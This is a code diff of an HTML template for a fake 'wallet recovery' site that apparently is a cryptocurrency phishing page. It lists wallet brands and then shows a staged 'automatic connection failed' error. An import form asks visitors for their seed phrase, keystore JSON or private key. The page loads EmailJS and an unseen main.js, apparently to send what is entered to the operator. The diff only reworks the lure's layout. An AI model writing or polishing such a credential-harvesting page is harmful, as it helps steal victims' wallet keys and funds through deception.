@@ -3,385 +3,212 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure-Recovery-protocol  - Wallet Recovery Platform</title>
+    <title>Secure Recovery Protocol - Wallet Recovery Platform</title>
+
+    <!-- Fonts & Icons -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}?v=20250817181800">
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/modal-override.css') }}?v=20250817183000">
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/modal-override.css') }}">
+
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
+
 <body>
-    <div class="hero-image-backdrop"></div>
-    
-    <div class="container">
-        <div class="main-content">
-            <div class="hero-badge">
-                <i class="fas fa-shield-alt"></i>
-                <span>Trusted Security Platform</span>
-            </div>
-            
-            <h1 class="title">SECURE-RECOVERY-PROTOCOL</h1>
-            
-            <div class="hero-image-container">
-                <img src="{{ url_for('static', filename='images/hero-image.jpeg') }}" alt="Blockchain Technology" class="hero-image">
-            </div>
-            
-            <p class="description">
-                Advanced blockchain wallet recovery and troubleshooting platform. 
-                Regain access to your digital assets with enterprise-grade security 
-                and professional support.
-            </p>
-            
-            <div class="troubleshoot-section">
-                <label for="troubleshoot-select" class="troubleshoot-label">Troubleshoot an Issue</label>
-                <select id="troubleshoot-select" class="troubleshoot-dropdown">
-                    <option value="">Select an issue</option>
-                    <option value="claiming-issue">CLAIMING-ISSUE: Access denied when trying to claim?</option>
-                    <option value="bridging-issue">BRIDGING-ISSUE: Click here to bridge tokens or resolve bridging related issues?</option>
-                    <option value="defi/farming">DEFI-FARMING: Click here for DeFi or Commercial farming related issues?</option>
-                    <option value="api-issues">API related issues</option>
-                    <option value="nft-issues">NFT-ISSUE: Click here to resolve NFT related issues?</option>
-                    <option value="Recovery">RECOVERY: Click here for wallet recovery?</option>
-                    <option value="Buy-token/coin">BUYING-TOKEN/COIN: Click here to trade. Your account has to be marked as a trusted payment source to start trading?</option>
-                    <option value="Transaction-delay">TRANSACTION-DELAY: Click here for any transaction related error?</option>
-                    <option value="locked-data">LOCKED-DATA: Corrupted wallet data?</option>
-                    <option value="validation">VALIDATION: Click here to validate your wallet via Multisig?</option>
-                    <option value="login-error">LOGIN-ERROR: Error messages during wallet import?</option>
-                    <option value="exchange">EXCHANGE: Click here for token exchange or to resolve errors encountered during token exchange?</option>
-                    <option value="gas-fees">GAS-FEES: Gas fees too high?</option>
-                    <option value="address-format">ADDRESS-ERROR: Incorrect wallet address format?</option>
-                    <option value="lost-access">WALLET-ISSUE: Lost access to wallet?</option>
-                    <option value="mobile-app">APPLICATION-ISSUE: Mobile wallet app not opening?</option>
-                    <option value="multiple-connections">CONNECTION-ISSUE: Multiple wallet connections causing conflicts</option>
-                    <option value="network-not-found">MISSING-NETWORK: Network not found in wallet?</option>
-                    <option value="phishing-alerts">PHISHING-ALERT: Phishing alerts in wallet?</option>
-                    <option value="private-key-compromised">PRIVACY-COMPROMISED: Private key compromised?</option>
-                    <option value="recovery-phrase">PHRASE-ERROR: Recovery phrase not accepted?</option>
-                    <option value="security-warnings">SECURITY-BRIDGE: Security warnings on wallet site?</option>
-                    <option value="seed-backup-lost">LOST-CREDENTIALS: Seed phrase backup lost?</option>
-                    <option value="slow-ui">WALLET-MALFUNCTION: Slow wallet UI response?</option>
-                    <option value="stuck-connecting">NETWORK-ERROR: Stuck on connecting wallet screen?</option>
-                    <option value="sync-issues">UNABLE-TO-SYNC: Sync issues with blockchain explorer</option>
-                    <option value="transaction-rejected">TRANSACTION: Transaction rejected by user?</option>
-                    <option value="unable-switch">SWITCH-ISSUE: Unable to switch accounts?</option>
-                    <option value="disconnecting">DISCONNECTION: Wallet disconnecting unexpectedly?</option>
-                    <option value="not-detected">DETECTION-ERROR: Wallet not detected by dApp?</option>
-                    <option value="other">Others</option>
-                </select>
-            </div>
-            
-            <button id="connect-wallet-btn" class="connect-wallet-btn">
-                <i class="fas fa-wallet me-2"></i>Connect Wallet
-                <span class="btn-glow"></span>
-            </button>
-        </div>
-    </div>
 
-    <!-- Wallet Selection Modal -->
-    <div id="wallet-modal" class="modal hidden">
-        <div class="modal-content">
-            <h3><i class="fas fa-wallet wallet-info-icon"></i>Connect your wallet</h3>
-            <div class="wallet-list">
-                <div class="wallet-item" data-wallet="metamask">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🦊</div>
-                    <span>MetaMask</span>
-                </div>
-                <div class="wallet-item" data-wallet="trust">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🛡️</div>
-                    <span>Trust Wallet</span>
-                </div>
-                <div class="wallet-item" data-wallet="coinbase">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">©</div>
-                    <span>Coinbase Wallet</span>
-                </div>
-                <div class="wallet-item" data-wallet="xumm">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">✗</div>
-                    <span>Xumm</span>
-                </div>
-                <div class="wallet-item" data-wallet="cardano">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">⚡</div>
-                    <span>Cardano</span>
-                </div>
-                <div class="wallet-item" data-wallet="daedalus">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🗲</div>
-                    <span>Daedalus</span>
-                </div>
-                <div class="wallet-item" data-wallet="yoroi">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🌊</div>
-                    <span>Yoroi</span>
-                </div>
-                <div class="wallet-item" data-wallet="ccvault">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🔒</div>
-                    <span>CCVault</span>
-                </div>
-                <div class="wallet-item" data-wallet="phantom">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">👻</div>
-                    <span>Phantom</span>
-                </div>
-                <div class="wallet-item" data-wallet="solflare">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">☀️</div>
-                    <span>Solflare</span>
-                </div>
-                <div class="wallet-item" data-wallet="exodus">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🌍</div>
-                    <span>Exodus</span>
-                </div>
-                <div class="wallet-item" data-wallet="atomic">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">⚛️</div>
-                    <span>Atomic Wallet</span>
-                </div>
-                <div class="wallet-item" data-wallet="ledger">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">📱</div>
-                    <span>Ledger</span>
-                </div>
-                <div class="wallet-item" data-wallet="trezor">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🔐</div>
-                    <span>Trezor</span>
-                </div>
-                <div class="wallet-item" data-wallet="safepal">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🛡️</div>
-                    <span>SafePal</span>
-                </div>
-                <div class="wallet-item" data-wallet="mathwallet">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🧮</div>
-                    <span>Math Wallet</span>
-                </div>
-                <div class="wallet-item" data-wallet="tokenpocket">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🎒</div>
-                    <span>TokenPocket</span>
-                </div>
-                <div class="wallet-item" data-wallet="binancechain">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🔗</div>
-                    <span>Binance Chain</span>
-                </div>
-                <div class="wallet-item" data-wallet="walletconnect">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🔗</div>
-                    <span>WalletConnect</span>
-                </div>
-                <div class="wallet-item" data-wallet="rainbow">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🌈</div>
-                    <span>Rainbow</span>
-                </div>
-                <div class="wallet-item" data-wallet="argent">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🏛️</div>
-                    <span>Argent</span>
-                </div>
-                <div class="wallet-item" data-wallet="gnosissafe">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🔒</div>
-                    <span>Gnosis Safe</span>
-                </div>
-                <div class="wallet-item" data-wallet="keplr">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🌌</div>
-                    <span>Keplr</span>
-                </div>
-                <div class="wallet-item" data-wallet="terrastation">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🌍</div>
-                    <span>Terra Station</span>
-                </div>
-                <div class="wallet-item" data-wallet="cosmostation">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🚀</div>
-                    <span>Cosmostation</span>
-                </div>
-                <div class="wallet-item" data-wallet="leapwallet">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🦘</div>
-                    <span>Leap Wallet</span>
-                </div>
-                <div class="wallet-item" data-wallet="polygon">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🔷</div>
-                    <span>Polygon</span>
-                </div>
-                <div class="wallet-item" data-wallet="avalanche">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🏔️</div>
-                    <span>Avalanche</span>
-                </div>
-                <div class="wallet-item" data-wallet="harmony">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🎵</div>
-                    <span>Harmony</span>
-                </div>
-                <div class="wallet-item" data-wallet="nearwallet">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🔷</div>
-                    <span>Near Wallet</span>
-                </div>
-                <div class="wallet-item" data-wallet="polkadot">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">⚫</div>
-                    <span>Polkadot</span>
-                </div>
-                <div class="wallet-item" data-wallet="kusama">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">🐦</div>
-                    <span>Kusama</span>
-                </div>
-                <div class="wallet-item" data-wallet="other">
-                    <div class="wallet-status">●</div>
-                    <div class="wallet-icon">❓</div>
-                    <span>Other Wallet</span>
-                </div>
-            </div>
-        </div>
-    </div>
+<!-- BACKDROP -->
+<div class="hero-image-backdrop"></div>
 
-    <!-- Connection Steps Modal -->
-    <div id="steps-modal" class="modal hidden">
-        <div class="modal-content">
-            <div class="text-center">
-                <div class="loading-spinner"></div>
-                <h3 id="step-title">Connecting...</h3>
-                <p id="step-description">Connecting to your wallet...</p>
-            </div>
-        </div>
-    </div>
+<div class="container">
+    <div class="main-content text-center">
 
-    <!-- Import Modal -->
-    <div id="import-modal" class="modal hidden">
-        <div class="modal-content">
-            <div class="connection-error-message">
-                There was an error connecting automatically. But do not worry, you can still connect manually.
-            </div>
-            
-            <h3 class="import-title">
-                Import your <span id="wallet-name"></span> 
-                <i class="fas fa-wallet wallet-icon-small"></i>
-            </h3>
-            
-            <div class="import-options">
-                <div class="import-option active" data-option="seed">
-                    <span>Seed Phrase</span>
-                </div>
-                <div class="import-option" data-option="keystore">
-                    <span>Keystore JSON</span>
-                </div>
-                <div class="import-option" data-option="private">
-                    <span>Private Key</span>
-                </div>
-            </div>
-            
-            <div class="import-form">
-                <label for="seed-input">Enter your wallet seed phrase</label>
-                <textarea id="seed-input" placeholder="Enter your seed phrase" rows="5"></textarea>
-                
-                <div class="form-actions">
-                    <button id="validate-btn" class="validate-btn">
-                        Validate
-                    </button>
-                    <button id="close-btn" class="close-btn">
-                        Close
-                    </button>
-                </div>
-            </div>
+        <!-- Badge -->
+        <div class="hero-badge mb-3">
+            <i class="fas fa-shield-alt"></i>
+            <span>Secure • Trusted • Encrypted</span>
         </div>
-    </div>
 
-    <!-- Validation Modal -->
-    <div id="validation-modal" class="modal hidden">
-        <div class="modal-content">
-            <div class="text-center">
-                <div class="loading-spinner"></div>
-                <h3>Validating Wallet</h3>
-                <p>Please wait while we validate your wallet credentials...</p>
-            </div>
+        <!-- Title -->
+        <h1 class="title">SECURE RECOVERY PROTOCOL</h1>
+
+        <!-- Image -->
+        <div class="hero-image-container">
+            <img src="{{ url_for('static', filename='images/hero-image.jpeg') }}" class="hero-image" alt="Blockchain Security">
         </div>
-    </div>
 
-    <!-- Error Modal -->
-    <div id="error-modal" class="modal hidden">
-        <div class="modal-content error-content">
-            <div class="text-center">
-                <div class="error-icon">!</div>
-                <h3>Validation Failed</h3>
-                <p>There was an error validating your wallet. Please check your credentials and try again.</p>
-            </div>
+        <!-- Description -->
+        <p class="description">
+            Enterprise-grade blockchain wallet recovery and troubleshooting platform.
+            Restore access to your digital assets with advanced security infrastructure
+            and seamless connectivity.
+        </p>
+
+        <!-- Issue Selector -->
+        <div class="troubleshoot-section">
+            <label class="troubleshoot-label">Troubleshoot an Issue</label>
+            <select id="troubleshoot-select" class="troubleshoot-dropdown">
+                <option value="">Select an issue</option>
+                <option value="claiming">Claiming Issue</option>
+                <option value="bridging">Bridging Issue</option>
+                <option value="defi">DeFi / Farming</option>
+                <option value="api">API Errors</option>
+                <option value="nft">NFT Issues</option>
+                <option value="recovery">Wallet Recovery</option>
+                <option value="transaction">Transaction Delay</option>
+                <option value="validation">Wallet Validation</option>
+                <option value="login">Login Errors</option>
+                <option value="gas">High Gas Fees</option>
+                <option value="network">Network Issues</option>
+                <option value="security">Security Alerts</option>
+                <option value="other">Other</option>
+            </select>
         </div>
-    </div>
 
-    <!-- Custom Wallet Modal -->
-    <div id="custom-wallet-modal" class="modal hidden">
-        <div class="modal-content">
-            <h3><i class="fas fa-plus wallet-info-icon"></i>Enter Wallet Name</h3>
-            <div class="custom-input-form">
-                <label for="custom-wallet-input">Wallet Name:</label>
-                <input type="text" id="custom-wallet-input" placeholder="Enter your wallet name">
-                <div class="form-actions">
-                    <button id="custom-wallet-confirm" class="validate-btn">
-                        <i class="fas fa-check me-2"></i>Continue
-                    </button>
-                    <button id="custom-wallet-cancel" class="close-btn">
-                        <i class="fas fa-arrow-left me-2"></i>Back
-                    </button>
-                </div>
-            </div>
+        <!-- Connect Button -->
+        <button id="connect-wallet-btn" class="connect-wallet-btn mt-4">
+            <i class="fas fa-wallet me-2"></i> Connect Wallet
+        </button>
+
+    </div>
+</div>
+
+<!-- ================= MODALS ================= -->
+
+<!-- Wallet Modal -->
+<div id="wallet-modal" class="modal hidden">
+    <div class="modal-content">
+
+        <h3 class="text-center mb-4">
+            <i class="fas fa-wallet"></i> Connect Wallet
+        </h3>
+
+        <div class="wallet-grid">
+
+            <div class="wallet-item" data-wallet="metamask">🦊 MetaMask</div>
+            <div class="wallet-item" data-wallet="trust">🛡️ Trust Wallet</div>
+            <div class="wallet-item" data-wallet="coinbase">© Coinbase</div>
+            <div class="wallet-item" data-wallet="phantom">👻 Phantom</div>
+            <div class="wallet-item" data-wallet="exodus">🌍 Exodus</div>
+            <div class="wallet-item" data-wallet="atomic">⚛️ Atomic</div>
+            <div class="wallet-item" data-wallet="ledger">📱 Ledger</div>
+            <div class="wallet-item" data-wallet="trezor">🔐 Trezor</div>
+            <div class="wallet-item" data-wallet="rainbow">🌈 Rainbow</div>
+            <div class="wallet-item" data-wallet="walletconnect">🔗 WalletConnect</div>
+            <div class="wallet-item" data-wallet="other">❓ Other</div>
+
         </div>
-    </div>
 
-    <!-- Custom Issue Modal -->
-    <div id="custom-issue-modal" class="modal hidden">
-        <div class="modal-content">
-            <h3><i class="fas fa-exclamation-triangle wallet-info-icon"></i>Describe Your Issue</h3>
-            <div class="custom-input-form">
-                <label for="custom-issue-input">Issue Description:</label>
-                <textarea id="custom-issue-input" placeholder="Please describe your issue in detail" rows="4"></textarea>
-                <div class="form-actions">
-                    <button id="custom-issue-confirm" class="validate-btn">
-                        <i class="fas fa-check me-2"></i>Continue
-                    </button>
-                    <button id="custom-issue-cancel" class="close-btn">
-                        <i class="fas fa-times me-2"></i>Cancel
-                    </button>
-                </div>
-            </div>
+    </div>
+</div>
+
+<!-- Connecting Modal -->
+<div id="steps-modal" class="modal hidden">
+    <div class="modal-content text-center">
+        <div class="loading-spinner"></div>
+        <h3 id="step-title">Connecting...</h3>
+        <p id="step-description">Establishing secure connection</p>
+    </div>
+</div>
+
+<!-- Import Modal -->
+<div id="import-modal" class="modal hidden">
+    <div class="modal-content">
+
+        <div class="connection-error-message">
+            Automatic connection failed. Please import manually.
         </div>
-    </div>
 
-    <!-- Issue Confirmation Modal -->
-    <div id="issue-confirmation-modal" class="modal hidden">
-        <div class="modal-content">
-            <h3 id="issue-title"><i class="fas fa-link wallet-info-icon"></i>Connect to wallet to troubleshoot your issue</h3>
-            <p id="issue-description">Issue selected. Click continue to connect your wallet and resolve your problem.</p>
-            <div class="form-actions">
-                <button id="issue-continue" class="validate-btn">
-                    <i class="fas fa-arrow-right me-2"></i>Continue
-                </button>
-                <button id="issue-cancel" class="close-btn">
-                    <i class="fas fa-times me-2"></i>Cancel
-                </button>
-            </div>
+        <h3 class="import-title text-center">
+            Import <span id="wallet-name"></span>
+        </h3>
+
+        <!-- Horizontal Tabs -->
+        <div class="import-tabs">
+            <button class="tab active" data-tab="seed">Seed Phrase</button>
+            <button class="tab" data-tab="keystore">Keystore JSON</button>
+            <button class="tab" data-tab="private">Private Key</button>
         </div>
-    </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+        <!-- Forms -->
+        <div class="tab-content active" id="seed">
+            <textarea placeholder="Enter your seed phrase"></textarea>
+        </div>
+
+        <div class="tab-content" id="keystore">
+            <textarea placeholder="Paste keystore JSON"></textarea>
+        </div>
+
+        <div class="tab-content" id="private">
+            <input type="text" placeholder="Enter private key">
+        </div>
+
+        <div class="form-actions">
+            <button class="validate-btn">Validate</button>
+            <button class="close-btn">Cancel</button>
+        </div>
+
+    </div>
+</div>
+
+<!-- Validation Modal -->
+<div id="validation-modal" class="modal hidden">
+    <div class="modal-content text-center">
+        <div class="loading-spinner"></div>
+        <h3>Validating...</h3>
+        <p>Securely verifying wallet credentials</p>
+    </div>
+</div>
+
+<!-- Error Modal -->
+<div id="error-modal" class="modal hidden">
+    <div class="modal-content text-center">
+        <div class="error-icon">!</div>
+        <h3>Validation Failed</h3>
+        <p>Invalid credentials. Please try again.</p>
+    </div>
+</div>
+
+<!-- Custom Issue Modal -->
+<div id="custom-issue-modal" class="modal hidden">
+    <div class="modal-content">
+
+        <h3>Describe Your Issue</h3>
+
+        <textarea placeholder="Explain your issue..."></textarea>
+
+        <div class="form-actions">
+            <button class="validate-btn">Continue</button>
+            <button class="close-btn">Cancel</button>
+        </div>
+
+    </div>
+</div>
+
+<!-- Issue Confirm -->
+<div id="issue-confirmation-modal" class="modal hidden">
+    <div class="modal-content text-center">
+
+        <h3>Proceed to Connect Wallet</h3>
+        <p>Continue to resolve selected issue</p>
+
+        <div class="form-actions">
+            <button class="validate-btn">Continue</button>
+            <button class="close-btn">Cancel</button>
+        </div>
+
+    </div>
+</div>
+
+<!-- Scripts -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="{{ url_for('static', filename='js/main.js') }}"></script>
+
 </body>
 </html>
